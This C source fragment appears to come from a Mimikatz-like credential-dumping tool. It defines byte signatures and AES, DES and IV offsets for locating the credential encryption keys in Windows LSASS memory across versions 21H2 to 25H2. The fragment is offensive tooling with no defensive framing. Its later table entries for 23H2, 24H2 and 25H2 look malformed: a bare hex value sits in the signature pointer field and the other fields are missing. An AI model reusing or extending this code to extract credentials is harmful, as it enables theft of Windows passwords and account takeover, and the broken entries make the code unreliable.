typedef struct {
    char* WindowsVersion;
    unsigned char* credentialKeySig;
    int KeySigSize;
    int AES_OFFSET;
    int DES_OFFSET;
    int IV_OFFSET;
} LsassCredentialKeyOffsets;

unsigned char credentialKeySig21h2[] = { 0x83, 0x64, 0x24, 0x30, 0x00, 0x48, 0x8d, 0x45, 0xe0, 0x44, 0x8b, 0x4d, 0xd8, 0x48, 0x8d, 0x15 };
unsigned char credentialKeySig22h2[] = { 0x83, 0x64, 0x24, 0x30, 0x00, 0x48, 0x8d, 0x45, 0xe0, 0x44, 0x8b, 0x4d, 0xd8, 0x48, 0x8d, 0x15 };

// Version, credential key sig, keysig size, AES, DES, IV
// Mimikatz: IV, DES, AES
LsassCredentialKeyOffsets LsassKeyOffsetsArray[] = {
{"21H2", credentialKeySig21h2, sizeof(credentialKeySig21h2), 16, -89, 67},
{"22H2", credentialKeySig22h2, sizeof(credentialKeySig22h2), 16, -89, 67},
{"23H2", 0x7d8},
{"24H2", 0x558},
{"25H2", 0x558}
};